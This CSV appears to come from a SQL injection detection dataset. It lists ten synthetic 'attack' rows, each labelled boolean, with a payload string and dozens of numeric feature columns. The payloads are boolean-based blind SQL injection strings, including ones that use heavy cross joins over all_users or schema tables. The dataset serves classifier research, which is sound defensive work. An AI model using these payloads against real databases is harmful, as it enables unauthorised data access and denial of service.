id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001134,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,5.730505655172089,231.39051818847656,83.86996459960938,24.332351684570312,74.18403625488281,0.23301807045936584,55.065818786621094,27.03427505493164,1.210364818572998,0.3113694190979004,0.1241125538945198,0.3357120454311371,0.14121678471565247,3.972076416015625,0.8711918592453003,1.0857635736465454,-0.12051313370466232,0.08728818595409393,-0.12890328466892242,-0.34076520800590515,6.116455554962158,6.237787246704102,2.5323398113250732,0.5066680312156677,1.3365044593811035,-0.3671312928199768,0.053348880261182785,0.18722525238990784,2.5218353271484375,1.2181767225265503,0.7814976572990417,-0.5110200643539429,-0.05749773606657982,-0.3927847445011139,0.31782737374305725,1.3426264524459839,5.623734474182129,0.944503128528595,1.209105372428894,0.16606374084949493,0.5734033584594727,0.8676458597183228,0.025883719325065613,0.12642022967338562,0.011598322540521622,0.3931240141391754,0.2772029936313629,0.2637009620666504,0.2138916701078415,0.4689801037311554,0.09168151021003723,0.1274247169494629,-0.6335639953613281,0.5176016688346863,0.11610259115695953,-0.08178693801164627,0.49987146258354187,0.07891950011253357,-0.636648416519165,-0.3279452323913574,-0.6381659507751465,0.09431315958499908,0.28982794284820557,4.188205242156982,0.25011610984802246,0.04717009887099266,0.08508219569921494,0.40875518321990967,0.07000407576560974,0.3092293441295624,-0.3432938754558563,0.828200101852417,-0.8086145520210266,0.10971400141716003,0.05942706763744354,-0.8198176622390747,1.3565974235534668,0.6500258445739746,-0.2109079211950302,-0.24021436274051666,-0.18692561984062195,8.530939102172852,1.2681926488876343,0.4223538637161255,0.7016236186027527,-0.25342631340026855,0.5530316829681396,0.37804561853408813,-0.37263864278793335
GAN_001135,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.744146427135563,233.1864013671875,91.74433135986328,20.6790828704834,80.32254028320312,0.23176248371601105,52.383487701416016,21.084800720214844,1.3872370719909668,0.33859193325042725,0.12108676880598068,0.3358288109302521,0.14313402771949768,3.8926079273223877,0.9218825101852417,0.5226922035217285,0.1811232715845108,0.1078772097826004,-0.1578877568244934,-0.15592510998249054,6.60447359085083,7.545070648193359,2.441591262817383,0.09028924256563187,1.530860185623169,-0.6461884379386902,-0.08181628584861755,0.04015706852078438,1.6009079217910767,0.9820417165756226,0.8909768462181091,-0.7725976705551147,-0.11741454154253006,-0.24836154282093048,0.5564042329788208,1.214507818222046,6.734320163726807,0.8847657442092896,1.0008862018585205,0.37022730708122253,0.5595386028289795,0.7991716861724854,0.08971592783927917,0.5405756235122681,-0.02080807462334633,0.4305258095264435,0.33357301354408264,0.21873639523983002,0.22597084939479828,0.3841418921947479,0.15945276618003845,0.09588702768087387,-0.45450931787490845,0.3093322515487671,0.1497936248779297,-0.3352052867412567,0.43881526589393616,-0.027047744020819664,-0.5325984954833984,-0.4090648889541626,-0.5884192585945129,0.1649201214313507,0.041507408022880554,3.8788297176361084,0.04369916766881943,0.020891454070806503,0.09729275107383728,-0.107776939868927,-0.017114583402872086,0.5236408710479736,-0.5267971158027649,0.8175678849220276,-0.446903795003891,0.05920025333762169,0.2885531187057495,-0.8573955297470093,1.166075348854065,0.6775437593460083,-0.1285194307565689,-0.23731787502765656,0.04354967549443245,11.487031936645508,1.1854884624481201,0.11687284708023071,0.30130094289779663,-0.703947126865387,0.5326278209686279,0.6318296790122986,-0.44400203227996826
GAN_001136,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,5.826679959816231,253.0711669921875,75.66869354248047,19.618043899536133,75.2157974243164,0.23393310606479645,39.01881790161133,24.693374633789062,0.9953507781028748,0.29754874110221863,0.13475456833839417,0.32497915625572205,0.15234073996543884,4.021910667419434,1.2564398050308228,0.8981360197067261,-0.022463850677013397,0.08310254663228989,-0.059035249054431915,-0.3234977722167969,5.666385650634766,6.091533184051514,1.7834126949310303,0.09145347774028778,1.3847211599349976,-0.7061607241630554,0.2334347814321518,-0.030680041760206223,1.6754047870635986,1.0002738237380981,0.7395787835121155,-0.5720154047012329,-0.009375321678817272,-0.3197031319141388,0.46877411007881165,1.2056970596313477,5.882482051849365,0.8200453519821167,1.0673725605010986,0.5002273321151733,0.40036696195602417,0.710278332233429,-0.017536286264657974,-0.12589360773563385,0.15242880582809448,0.40187403559684753,0.013080434873700142,0.24110476672649384,0.16861149668693542,0.39544400572776794,0.13200293481349945,0.15142233669757843,-0.26702412962913513,0.5918645858764648,0.16937333345413208,-0.4552742540836334,0.5577254891395569,0.10098445415496826,-0.26811087131500244,-0.4689657688140869,-0.6122355461120605,0.12973769009113312,0.23464706540107727,3.921379327774048,-0.14819088578224182,0.005222811829298735,0.0862281545996666,0.2881894111633301,-0.21773836016654968,0.34572383761405945,-0.6340464949607849,0.8379082083702087,-0.8120710253715515,0.04614698141813278,0.16457246243953705,-0.8847472667694092,1.1194965839385986,0.7641316652297974,-0.34504440426826477,-0.2535701096057892,0.036720577627420425,9.276366233825684,1.164939522743225,0.2752626836299896,0.3510788679122925,-0.4216362535953522,0.8174065947532654,0.2802105247974396,-0.18944351375102997
GAN_001137,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,4.901344842038826,202.64166259765625,83.65802764892578,24.25127410888672,67.76702117919922,0.1260824352502823,47.23015213012695,28.621662139892578,1.3191566467285156,0.29811975359916687,0.1381606012582779,0.34316691756248474,0.14711222052574158,3.79948091506958,1.184736967086792,0.5480183362960815,0.36662107706069946,0.04884286969900131,-0.07787441462278366,-0.27452751994132996,6.153684139251709,5.223801612854004,2.137831449508667,0.33554625511169434,1.5276697874069214,-0.258944034576416,0.08228476345539093,0.395031213760376,1.279374122619629,0.9104771018028259,0.6605124473571777,-0.2856943905353546,-0.05947596952319145,-0.16861669719219208,0.4288046061992645,1.4442663192749023,5.97844934463501,0.9088109731674194,1.0676487684249878,-0.08091690391302109,0.503528356552124,0.6873215436935425,-0.06233616918325424,0.21585112810134888,-0.016819598153233528,0.3981100618839264,0.11995913833379745,0.2744889259338379,0.2515096366405487,0.2889925539493561,0.12633801996707916,0.13817764818668365,-0.23931214213371277,0.39934858679771423,0.00046218931674957275,-0.2324577271938324,0.06343197077512741,0.18352559208869934,-0.31454044580459595,-0.1433326154947281,-0.13353465497493744,0.10845369100570679,0.11007123440504074,3.4685120582580566,-0.017257340252399445,-0.015129347331821918,0.03667522221803665,0.17883676290512085,-0.02004440501332283,0.09561106562614441,-0.1551544964313507,0.49229568243026733,-0.4073638617992401,0.05982043594121933,0.08032986521720886,-0.45061442255973816,1.054976463317871,0.6607405543327332,-0.07888512313365936,-0.04684086889028549,-0.01939374953508377,7.506651878356934,1.0349911451339722,0.14259003102779388,0.16397014260292053,-0.2800436019897461,0.20167991518974304,0.17284967005252838,-0.33403193950653076
GAN_001138,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,7.244428839337049,245.06564331054688,98.39331817626953,19.076339721679688,86.03173065185547,0.39785563945770264,44.51755142211914,24.717802047729492,1.3455512523651123,0.2955690026283264,0.09446991235017776,0.3095627725124359,0.14490030705928802,3.9484143257141113,0.6799598336219788,0.5702821016311646,-0.028269819915294647,0.14540491998195648,-0.11029534786939621,-0.5065776705741882,7.684208869934082,7.073430061340332,1.6339632272720337,0.4604099690914154,1.5757215023040771,-0.5193658471107483,0.1833939105272293,0.21349674463272095,2.4847571849823,1.3072317838668823,1.1086045503616333,-1.113724708557129,-0.11381465941667557,-0.22841516137123108,0.40902179479599,1.0038456916809082,8.468122482299805,0.8798024654388428,1.0787209272384644,0.36996588110923767,0.5946613550186157,0.9863199591636658,0.2657051384449005,0.3636120557785034,-0.19173020124435425,0.575679361820221,0.1154107004404068,0.38811030983924866,0.34832441806793213,0.4800599217414856,0.16892747581005096,0.19304271042346954,-0.49706172943115234,0.6087070107460022,-0.20700255036354065,-0.553032398223877,0.8754150867462158,0.014063606038689613,-0.9879816770553589,-0.6943469643592834,-0.6690197587013245,0.05117480456829071,0.6209920644760132,5.467618942260742,-0.2828415632247925,-0.023324046283960342,0.11206407099962234,0.2884865999221802,-0.125263050198555,0.4308752715587616,-0.5347670912742615,1.2822179794311523,-0.717216968536377,0.1384519636631012,0.23582077026367188,-1.319826364517212,1.5612021684646606,0.6940975189208984,-0.31151121854782104,-0.358293354511261,0.12440083920955658,9.621880531311035,1.2356680631637573,0.3436410427093506,0.3946295380592346,-0.8875269293785095,1.0476529598236084,0.6123039722442627,-0.4291088581085205
GAN_001139,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,5.890811076846689,223.45516967773438,84.72223663330078,21.343395233154297,67.14751434326172,0.26322248578071594,47.54818344116211,26.56712532043457,1.1692008972167969,0.3127143979072571,0.12158825248479843,0.3304489850997925,0.15164373815059662,3.9128522872924805,0.8624961972236633,0.6928564310073853,0.21352656185626984,0.09363460540771484,-0.041616834700107574,-0.32985720038414,5.571792125701904,5.34006404876709,2.1453206539154053,0.3995237350463867,1.5113407373428345,-0.394332617521286,0.049291957169771194,0.08676969259977341,2.25191593170166,1.1520251035690308,0.8717506527900696,-0.7826285362243652,0.026495501399040222,-0.400308758020401,0.40867918729782104,1.1861958503723145,6.294816493988037,0.8046455979347229,1.1461338996887207,0.234511598944664,0.5236059427261353,0.9513440728187561,-0.037529151886701584,0.2673396170139313,-0.22041618824005127,0.5419186949729919,0.14484788477420807,0.29522785544395447,0.24814076721668243,0.4319837987422943,0.13618820905685425,0.11465161293745041,-0.4105193018913269,0.542198896408081,-0.12139417231082916,-0.2914178669452667,0.5875247120857239,-0.062342457473278046,-0.7719877362251282,-0.4398864805698395,-0.6848598718643188,0.2681220769882202,0.3880354166030884,3.6151649951934814,-0.07256518304347992,-0.023904111236333847,0.09196717292070389,0.40958404541015625,-0.07925865054130554,0.2056240439414978,-0.33689385652542114,0.9373162984848022,-0.7917165160179138,0.10413951426744461,0.1788823902606964,-0.9445102214813232,1.4574564695358276,0.6605883836746216,-0.18935874104499817,-0.2224634438753128,-0.09187230467796326,8.360352516174316,1.2448503971099854,0.23371508717536926,0.3678255081176758,-0.5158182382583618,0.8010014891624451,0.5182710886001587,-0.2937529683113098
GAN_001140,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.642595970314257,249.03076171875,90.76117706298828,24.598596572875977,91.13602447509766,0.304127037525177,41.7312126159668,25.779172897338867,1.371561884880066,0.2753777503967285,0.10019288212060928,0.31677770614624023,0.13775205612182617,3.9693620204925537,0.8445280194282532,0.9680641889572144,-0.0648152157664299,0.1440511792898178,-0.18427154421806335,-0.574321985244751,6.608201503753662,8.554818153381348,1.6751081943511963,0.377647340297699,1.3466781377792358,-0.3906044363975525,-0.024367917329072952,0.19745992124080658,2.197618246078491,1.273523211479187,1.0435892343521118,-0.6784573793411255,-0.172489732503891,0.03218229115009308,0.41535890102386475,1.1421908140182495,6.821747303009033,0.8435050249099731,1.271951675415039,0.3155946731567383,0.603075385093689,0.6974796056747437,0.40168970823287964,0.459547221660614,0.045665182173252106,0.49803751707077026,0.2542745769023895,0.33742469549179077,0.2331942468881607,0.451804518699646,0.1076350137591362,0.20439870655536652,-0.5645363330841064,0.3317246437072754,-0.11970940232276917,-0.28307193517684937,0.8243941068649292,0.0759655088186264,-0.5936884880065918,-0.4752264618873596,-0.6356925964355469,0.12186950445175171,0.15758302807807922,5.200347423553467,0.09096916764974594,0.027772454544901848,0.07876143604516983,0.1979524940252304,-0.05256621167063713,0.44742316007614136,-0.518234133720398,1.1517387628555298,-0.5955525040626526,0.11174826323986053,0.2389967143535614,-1.1134889125823975,1.1720759868621826,0.7258672714233398,-0.3754120469093323,-0.31875503063201904,0.1458711177110672,10.028109550476074,1.1225385665893555,0.3143532872200012,0.393537700176239,-0.5843307375907898,0.7116571068763733,0.5390520095825195,-0.40081262588500977
GAN_001141,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.4103230079874285,226.05564880371094,85.64686584472656,20.328739166259766,67.92591857910156,0.30861446261405945,35.89630126953125,25.830745697021484,1.5501141548156738,0.29056257009506226,0.15634098649024963,0.3316875994205475,0.16089114546775818,3.7983949184417725,0.0031114236917346716,0.5999667644500732,0.24792100489139557,0.11560633778572083,-0.16366907954216003,-0.4425274133682251,4.575300693511963,6.396437168121338,1.7551230192184448,0.4226336181163788,1.2853288650512695,-0.34474992752075195,0.23730559647083282,0.214529350399971,1.503137469291687,0.9772071838378906,1.2341625690460205,-0.8110759854316711,-0.0705743208527565,-0.6116611361503601,0.25240617990493774,1.4087923765182495,7.840285301208496,0.8964072465896606,1.1954914331436157,0.10380235314369202,0.6186667084693909,0.9054012894630432,0.0731632262468338,0.3089684247970581,-0.005351286381483078,0.6241432428359985,0.3345079720020294,0.3717227578163147,0.2729697525501251,0.4176211357116699,0.08996015787124634,0.042642004787921906,-0.7896735668182373,0.519148588180542,-0.06809280812740326,-0.6967133283615112,0.4356854557991028,0.022805893793702126,-0.6849071979522705,-0.581224262714386,-0.329437792301178,0.1319570541381836,0.5372044444084167,4.051169395446777,-0.1337931603193283,0.022450793534517288,0.06390217691659927,0.14009086787700653,-0.24997341632843018,0.41043347120285034,-0.2629144787788391,0.8278679251670837,-0.8887019157409668,0.1041731983423233,0.1604008674621582,-0.8150086402893066,1.362258791923523,0.7376620769500732,-0.42397141456604004,-0.16611842811107635,-0.18516167998313904,8.588968276977539,1.2952696084976196,0.006178900599479675,0.5103099942207336,-0.6251220703125,0.5828593969345093,0.5471527576446533,-0.6306343078613281
GAN_001142,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.9575285434150995,211.34153747558594,84.11766052246094,23.67106056213379,70.56841278076172,0.24422556161880493,40.82854080200195,24.71702766418457,1.3182005882263184,0.30636903643608093,0.1450567990541458,0.3478419780731201,0.1509544849395752,3.897758722305298,0.10757619142532349,0.8918675780296326,0.1683177500963211,0.1140003651380539,-0.1288384199142456,-0.4317576587200165,6.037683010101318,6.816573619842529,1.678253173828125,0.18878620862960815,1.3444678783416748,-0.40197357535362244,0.1790517121553421,0.027293402701616287,1.7770379781723022,0.9383171200752258,1.057348608970642,-0.6167357563972473,-0.042611461132764816,-0.45676955580711365,0.31302252411842346,1.25003182888031,5.563833236694336,0.7393114566802979,1.0008496046066284,0.1333562284708023,0.5459952354431152,0.8062050938606262,-0.05533013865351677,0.2987911105155945,-0.05811791867017746,0.3439658284187317,0.308170884847641,0.3120908737182617,0.24784259498119354,0.3955222964286804,0.06076134741306305,0.08920299261808395,-0.5180751085281372,0.43396949768066406,0.09026198089122772,-0.3204307556152344,0.5438849329948425,0.09983497112989426,-0.5895122289657593,-0.4435407221317291,-0.44725003838539124,-0.11375753581523895,0.3349631428718567,4.232072830200195,-0.062087416648864746,0.03102586232125759,0.0475752055644989,0.07019662111997604,0.019599709659814835,0.3704727292060852,-0.14376389980316162,0.8648454546928406,-0.8154639005661011,0.10161568969488144,0.2687627077102661,-0.5896347761154175,1.316803216934204,0.805894672870636,-0.22383837401866913,-0.1380881816148758,-0.18319113552570343,8.988717079162598,1.311259150505066,-0.07738582044839859,0.4589449167251587,-0.636762261390686,0.5859465599060059,0.48327401280403137,-0.5450764298439026
GAN_001143,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.22531721514702,239.85830688476562,90.79798889160156,24.06624984741211,76.13774871826172,0.3189786970615387,47.1839714050293,24.930694580078125,1.2586567401885986,0.3070657253265381,0.13288715481758118,0.3270072042942047,0.14745934307575226,3.9993767738342285,0.605292797088623,0.8604373931884766,-0.031511835753917694,0.1306658685207367,-0.2105923295021057,-0.358917772769928,6.896336555480957,6.6619553565979,1.7481142282485962,0.1330709457397461,1.4397914409637451,-0.5672577619552612,0.006998676806688309,0.08540751785039902,2.0610220432281494,1.1573452949523926,1.1168400049209595,-0.8836420178413391,-0.16200263798236847,-0.40408527851104736,0.41240495443344116,1.2299883365631104,5.720695972442627,0.8355470895767212,0.9855687022209167,0.239581897854805,0.5738848447799683,0.9165956377983093,-0.049400538206100464,0.19056345522403717,0.03535067290067673,0.33427515625953674,0.26425713300704956,0.3256426453590393,0.21323983371257782,0.4537523686885834,0.0688432827591896,0.14108113944530487,-0.524289608001709,0.6286279559135437,0.05215732753276825,-0.36627092957496643,0.5129874348640442,0.10923951864242554,-0.5027536153793335,-0.6869888305664062,-0.47863075137138367,0.08572380244731903,0.29382479190826416,4.567616939544678,0.10973013937473297,0.001140407519415021,0.05150611326098442,0.07440147548913956,-0.06430323421955109,0.3909476399421692,-0.37006911635398865,1.080269694328308,-0.8680107593536377,0.09787922352552414,0.2405049353837967,-1.0075902938842773,1.3776309490203857,0.660679817199707,-0.24319066107273102,-0.20956529676914215,-0.0652303546667099,9.294404029846191,1.2481424808502197,0.14722776412963867,0.5121810436248779,-0.7254503965377808,0.74384605884552,0.5157834887504578,-0.46473389863967896
